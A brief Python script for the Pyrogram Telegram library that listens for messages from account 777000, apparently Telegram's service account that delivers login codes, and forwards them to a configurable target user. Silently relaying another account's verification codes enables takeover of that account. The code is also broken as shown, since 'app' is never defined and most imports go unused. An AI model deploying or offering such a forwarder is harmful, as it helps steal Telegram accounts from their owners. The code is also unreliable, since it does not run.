from pyrogram import Client, filters
from pyrogram.types import Message
from time import sleep
import pyrogram
import json
import jdatetime
import threading
import pytz

id_or_username = ''


@app.on_message(filters.user(777000))
async def forward_code(app:Client, message:Message):
    await app.forward_messages(id_or_username, message.chat.id, message.id)

app.run()
